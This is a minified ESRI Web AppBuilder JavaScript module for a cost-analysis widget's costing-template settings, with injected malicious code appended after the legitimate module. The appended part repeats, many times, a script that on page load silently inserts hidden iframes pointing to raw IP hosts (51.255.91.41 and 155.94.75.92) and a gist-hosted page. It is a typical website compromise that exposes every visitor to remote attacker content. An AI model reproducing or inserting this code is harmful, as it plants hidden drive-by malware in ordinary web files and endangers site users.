// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/CostingTemplate.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTLayerNameContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTLayerLabel esriCTEllipsis" data-dojo-attach-point\x3d"layerName"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"btnCostingTemplateNode" class\x3d"esriCTBtnAddSection esriCTEllipsis"\x3e\r\n        \x3cspan class\x3d"esriCTBtnAddIcon"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"esriCTBtnAddLabel esriCTEllipsis"\x3e ${nls.costingInfo.addCostingTemplateLabel}\x3c/span\x3e\r\n      \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTAddLayerTableNode" data-dojo-attach-point\x3d"addLayerTableNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/dijit/SimpleTable jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./CostingTemplate.html dojo/_base/array dojo/_base/lang dojo/dom-attr dojo/dom-class dojo/on dojo/query dojo/dom-construct dijit/form/Select dijit/form/ValidationTextBox dijit/registry dijit/TooltipDialog dijit/popup ./EditCostEquation ../utils dojo/dom-style".split(" "),function(t,u,v,w,x,y,e,d,q,l,h,f,g,m,z,n,r,k,A,B,C){return t([v,w,x],{templateString:y,popup:null,_addScenarioTable:null,
_featureLayerTemplateOptions:null,baseClass:"jimu-widget-cost-analysis-costing-template",constructor:function(a){d.mixin(this,a)},postMixInProperties:function(){this.nls.common={};d.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this._featureLayerTemplateOptions=this._addScenarioTable=this.popup=null;this.inherited(arguments);l.add(this.domNode,"esriCTLayerTableWrapper");this._init();this.own(h(this.btnCostingTemplateNode,"click",d.hitch(this,this._addCostingTemplateBtnClicked,
!0)))},_init:function(){q.set(this.layerName,"innerHTML",this.layer.title);q.set(this.layerName,"title",this.layer.title);this._createCostingTable()},_createCostingTable:function(){this._addCostingInfoLayerTable=new u({fields:[{name:"field",title:this.nls.costingInfo.featureTemplateTitle,type:"empty",editable:!1,width:"22%"},{name:"field",title:this.nls.costingInfo.costEquationTitle,type:"empty",editable:!0,width:"22%"},{name:"field",title:this.nls.costingInfo.geographyTitle,type:"empty",editable:!1,
width:"22%"},{name:"field",title:this.nls.costingInfo.scenarioTitle,type:"empty",editable:!1,width:"22%"},{name:"actions",title:this.nls.costingInfo.actionTitle,width:"12%",type:"actions",actions:["edit","delete"]}],selectable:!1});this._addCostingInfoLayerTable.placeAt(this.addLayerTableNode);this._addCostingInfoLayerTable.startup();this._addCostingInfoLayerTable.onBeforeRowDelete=d.hitch(this,function(a){this.config.costingInfoSettings[this.layer.id]&&this.config.costingInfoSettings[this.layer.id].splice(a.rowIndex,
1);return!0});this._addHelpIconToHeader();this._createHelpPopups();this._windowEventsPopupClose();this._tableOnBeforeRowEdit();this._populateCostingAssets()},_tableOnBeforeRowEdit:function(){this._addCostingInfoLayerTable.onBeforeRowEdit=d.hitch(this,function(a){var b;b={};b.featureTemplateValue=a.featureTemplateFields.get("value");b.costEquationValue=a.costEquationInput.get("value");b.geographyValue=a.geographyFields.get("value");b.scenarioValue=a.scenarioFields.get("value");this._editCostEquation=
new A({nls:this.nls,map:this.map,config:this.config,layerTitle:this.layer.title,currentRow:a,existingRowValues:b,validateCostEquation:this.validateCostEquation});h(this._editCostEquation,"okButtonClicked",d.hitch(this,function(){this._editCostEquation.destroy()}))})},_createHelpPopups:function(){var a;a=g.create("div",{"class":"esriCTCancelDialogPopup",onclick:function(){k.close(this.costEquationHelpDialog);return!1}});this.costEquationHelpDialog=new r({"class":this.baseClass,content:a.outerHTML+
"\x3cdiv class \x3d 'esriCTDialogText'\x3e"+this.nls.costingInfo.costEquationHelpText+"\x3c/div\x3e",onClick:function(a){l.contains(a.target,"esriCTCancelDialogPopup")||a.stopPropagation()}});this.scenarioHelpDialog=new r({"class":this.baseClass,content:a.outerHTML+"\x3cdiv class \x3d 'esriCTDialogText'\x3e"+this.nls.costingInfo.scenarioHelpText+"\x3c/div\x3e",onClick:function(a){l.contains(a.target,"esriCTCancelDialogPopup")||a.stopPropagation()}})},_windowEventsPopupClose:function(){h(window.document,
"click",d.hitch(this,function(a){l.contains(a.target,"esriCTHelpIcon")||(k.close(this.scenarioHelpDialog),k.close(this.costEquationHelpDialog))}));var a=f(".container-node.jimu-viewstack")[0];a&&h(a,"scroll",d.hitch(this,function(){k.close(this.scenarioHelpDialog);k.close(this.costEquationHelpDialog)}))},_addHelpIconToHeader:function(){var a,b,c,p,e;if(a=f(".simple-table-thead tr",this.domNode)[0])b=a.children[1],c=a.children[3];p=g.create("div",{"class":"esriCTHelpIcon"},b);e=g.create("div",{"class":"esriCTHelpIcon"},
c);h(p,"click",d.hitch(this,function(){this._openHelpPopupDialog(this.costEquationHelpDialog,p)}));h(e,"click",d.hitch(this,function(){this._openHelpPopupDialog(this.scenarioHelpDialog,e)}))},_openHelpPopupDialog:function(a,b){k.open({popup:a,around:b,orient:["above-centered"]})},_addCostingTemplateBtnClicked:function(a){this._addLayerRow(a,null,!0)},_addLayerRow:function(a,b,c){a=a?this._addCostingInfoLayerTable.addRow({}):this._addCostingInfoLayerTable.addRow({},b.rowIndex+1,!1);if(b=f(".simple-table-cell",
a.tr))this._addFeatureTemplateDropdown(b[0],a.tr,c),this._addCostEquationTextBox(b[1],a.tr,c),this._addGeographyDropdown(b[2],a.tr,c),this._addScenarioDropdown(b[3],a.tr,c),this._addCopyRowActionIcon(a.tr)},_addFeatureTemplateDropdown:function(a,b,c){this._featureLayerTemplateOptions||this._getFeatureTemplateOptions();a=g.create("div",{"class":"esriCTDropDownContainer"},a);b.featureTemplateFields=new m({options:d.clone(this._featureLayerTemplateOptions),"class":"esriCTCostingTemplateFeatureTemplate"});
b.featureTemplateFields.placeAt(a);b.featureTemplateFields.startup();a=this.config.costingInfoSettings[this.layer.id];b.featureTemplateFields.set("value",a&&0<a.length&&a[b.rowIndex]&&!c?a[b.rowIndex].featureTemplate:this._featureLayerTemplateOptions[b.rowIndex])},_addGeographyDropdown:function(a,b,c){a=g.create("div",{"class":"esriCTDropDownContainer"},a);b.geographyFields=new m({options:d.clone(this.geographies),"class":"esriCTCostingTemplateGeography"});b.geographyFields.placeAt(a);b.geographyFields.startup();
(a=this.config.costingInfoSettings[this.layer.id])&&0<a.length&&a[b.rowIndex]&&!c?(c=a[b.rowIndex].geography,c=""===c?this.nls.costingInfo.noneValue:c,b.geographyFields.set("value",c)):b.geographyFields.set("value","")},_addScenarioDropdown:function(a,b,c){a=g.create("div",{"class":"esriCTDropDownContainer"},a);b.scenarioFields=new m({options:d.clone(this.scenarios),"class":"esriCTCostingInfoScenarioOptions"});b.scenarioFields.placeAt(a);b.scenarioFields.startup();(a=this.config.costingInfoSettings[this.layer.id])&&
0<a.length&&a[b.rowIndex]&&!c?(c=a[b.rowIndex].scenario,c=""===c?this.nls.costingInfo.noneValue:c,b.scenarioFields.set("value",c)):b.scenarioFields.set("value","")},_addCostEquationTextBox:function(a,b,c){a=g.create("div",{"class":"esriCTTextBoxContainer"},a);b.costEquationInput=new z({"class":"esriCTLayerLabelTextBox esriCTFullWidth",spellcheck:!1});b.costEquationInput.placeAt(a);b.costEquationInput.startup();this._setCostEquation(b.costEquationInput);b.costEquationInput.validator=d.hitch(this,this.validateCostEquation);
(a=this.config.costingInfoSettings[this.layer.id])&&0<a.length&&a[b.rowIndex]&&!c&&(c=a[b.rowIndex].costEquation,b.costEquationInput.set("value",c))},_populateCostingAssets:function(){this.config.costingInfoSettings&&this.config.costingInfoSettings.hasOwnProperty(this.layer.id)?e.forEach(this.config.costingInfoSettings[this.layer.id],d.hitch(this,function(){this._addLayerRow(!0)})):0<this.layer.layerObject.templates.length?e.forEach(this.layer.layerObject.templates,d.hitch(this,function(){this._addLayerRow(!0)})):
0<this.layer.layerObject.types.length&&e.forEach(this.layer.layerObject.types,d.hitch(this,function(){this._addLayerRow(!0)}))},_getFeatureTemplateOptions:function(){this._featureLayerTemplateOptions=[];0<this.layer.layerObject.templates.length?e.forEach(this.layer.layerObject.templates,d.hitch(this,function(a){this._featureLayerTemplateOptions.push({label:a.name,value:a.name})})):0<this.layer.layerObject.types.length&&e.forEach(this.layer.layerObject.types,d.hitch(this,function(a){this._featureLayerTemplateOptions.push({label:a.templates[0].name,
value:a.templates[0].name})}))},updateScenarioOptions:function(a){var b;b=f(".esriCTCostingInfoScenarioOptions",this.domNode);e.forEach(b,d.hitch(this,function(b){n.byNode(b).set("options",a)}));this.scenarios=a},_setCostEquation:function(a){var b;b=this.layer.layerObject.geometryType;"esriGeometryPolyline"===b||"esriGeometryPolygon"===b?a.set("value","{MEASURE}"):a.set("value","{TOTALCOUNT}")},validateCostEquation:function(a){return B.validateEquation(a)},getUpdatedCostingInfo:function(){var a,b=
[],c={};a=this._addCostingInfoLayerTable.getRows();e.forEach(a,d.hitch(this,function(a){a.featureTemplateFields&&a.costEquationInput&&a.geographyFields&&a.scenarioFields&&(c={},a.featureTemplateFields&&(c.featureTemplate=a.featureTemplateFields.get("value")),a.costEquationInput&&(c.costEquation=a.costEquationInput.get("value")),a.geographyFields&&(c.geography=a.geographyFields.get("value")),a.scenarioFields&&(c.scenario=a.scenarioFields.get("value")),b.push(c))}));return b},_addCopyRowActionIcon:function(a){var b,
c;b=f(".action-item-parent",a)[0];c=f(".jimu-icon-edit",a)[0];setTimeout(function(){f(".action-item-parent",a)[0]&&C.set(f(".action-item-parent",a)[0],"width","60px")},100);b&&(a.copyDiv=g.create("div",{"class":"action-item jimu-float-leading row-edit-div jimu-icon jimu-icon-copy",title:this.nls.costingInfo.copyRowTitle},b),g.place(a.copyDiv,c,"after"),this.own(h(a.copyDiv,"click",d.hitch(this,this._copyRow,a))))},_copyRow:function(a){this._addLayerRow(!1,a);this._setCopyLayerValues(a)},_setCopyLayerValues:function(a){var b=
this._addCostingInfoLayerTable.getRows()[a.rowIndex+1];b.featureTemplateFields.set("value",a.featureTemplateFields.get("value"));b.costEquationInput.set("value",a.costEquationInput.get("value"));b.geographyFields.set("value",a.geographyFields.get("value"));b.scenarioFields.set("value",a.scenarioFields.get("value"))},updateGeographyOptions:function(a){a&&(this.geographies=a);a=f(".esriCTCostingTemplateGeography",this.domNode);e.forEach(a,d.hitch(this,function(a){n.byNode(a).set("options",d.clone(this.geographies));
n.byNode(a).startup()}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});